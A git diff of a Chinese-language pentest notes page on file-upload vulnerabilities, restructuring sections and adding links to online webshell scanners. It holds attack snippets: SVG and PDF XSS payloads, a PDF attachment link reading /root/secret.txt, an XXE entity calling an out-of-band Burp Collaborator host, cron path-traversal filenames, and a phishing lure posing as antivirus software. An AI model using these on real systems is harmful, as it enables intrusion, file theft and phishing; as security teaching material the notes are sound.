@@ -40,6 +40,11 @@
 - [upload-labs](https://github.com/c0ny1/upload-labs)
     - writeup : [upload-labs-WalkThrough](../靶场/upload-labs-WalkThrough.md)
 
+**在线 SQLi 测试**
+- https://scanner.baidu.com/#/pages/intro
+- https://n.shellpub.com/
+- https://webshellchop.chaitin.cn/demo/
+
 ---
 
 ## 检测方法
@@ -54,39 +59,58 @@ waf、rasp 对上传文件的检测方法有这几种
 
 ## 利用方式
 
-- 网站脚本文件
+### 网站脚本文件
 
-    如 asp、aspx、jsp、php 后缀的网站脚本文件，通过访问上传的 webshell 执行系统命令，获取服务器权限。
+如 asp、aspx、jsp、php 后缀的网站脚本文件，通过访问上传的 webshell 执行系统命令，获取服务器权限。
 
-- 可造成 XSS 或跳转的钓鱼文件
-    - html
-    - svg
-        ```html
-        <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
-        ```
-    - pdf
-        ```
-        app.alert('XSS');
-        ```
-    - xml
+### 可造成 XSS 或跳转的钓鱼文件
 
-- 服务器可执行文件(PE、sh) ： 配合社工手段,例如 : 最近办公内网发现大量勒索病毒,信息科紧急部署了新版杀毒引擎,请各部门人员立即下载,下载地址: www.xxx.com/upload/木马查杀工具.exe
-- mp4、avi : 配合 ffmpeg 漏洞
-- shtml : ssi 注入
-- xlsx : XXE
+- html
+- svg
+    ```html
+    <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+    ```
+- pdf
+    xss
+    ```
+    app.alert('XSS');
+    ```
 
-    1. 创建一个 xlsx 文档，更改后缀为 zip，解压。
-    2. 打开 Burp Suite Professional，单击 Burp 菜单并选择 “Burp Collaborator client” 将其打开, 复制到粘贴板。
-    3. 找到 Content_Types.xml 文件，插入 xxe 代码到文件中。
-        ```xml
-        <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://xxx.burpcollaborator.net"> ]>
-        <x>&xxe;</x>
-        ```
-    4. 重新压缩为 zip 文件，更改后缀为 xlsx。上传 xlsx 文档到目标服务器，如果没有禁用外部实体，就会存在 XXE 漏洞，burp 接收到请求。
-- 路径穿越写 shell
+    ssrf
+    ```
+    <link rel=attachment href="file:///root/secret.txt">
+    ```
+- xml
 
-    1. 例如可以上传文件名为 ../../../../var/spool/cron/root ,通过这种方式执行命令
-    2. 如果做了白名单后缀,只允许 jpg ,可以传到 /etc/cron.d/ 目录下,这里文件可以任意后缀命名,上传文件名为 …/…/…/…/…/…/etc/cron.d/test.jpg 绕过对应的安全检查
+### 服务器可执行文件(PE、sh)
+
+配合社工手段,例如 : 最近办公内网发现大量勒索病毒,信息科紧急部署了新版杀毒引擎,请各部门人员立即下载,下载地址: www.xxx.com/upload/木马查杀工具.exe
+
+### mp4、avi
+
+配合 ffmpeg 漏洞
+
+### shtml
+
+ssi 注入
+
+### xlsx
+
+XXE
+
+1. 创建一个 xlsx 文档，更改后缀为 zip，解压。
+2. 打开 Burp Suite Professional，单击 Burp 菜单并选择 “Burp Collaborator client” 将其打开, 复制到粘贴板。
+3. 找到 Content_Types.xml 文件，插入 xxe 代码到文件中。
+    ```xml
+    <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://xxx.burpcollaborator.net"> ]>
+    <x>&xxe;</x>
+    ```
+4. 重新压缩为 zip 文件，更改后缀为 xlsx。上传 xlsx 文档到目标服务器，如果没有禁用外部实体，就会存在 XXE 漏洞，burp 接收到请求。
+
+### 路径穿越写 shell
+
+1. 例如可以上传文件名为 `../../../../var/spool/cron/root` ,通过这种方式执行命令
+2. 如果做了白名单后缀,只允许 jpg ,可以传到 `/etc/cron.d/` 目录下,这里文件可以任意后缀命名,上传文件名为 `…/…/…/…/…/…/etc/cron.d/test.jpg` 绕过对应的安全检查
 
 ---
 
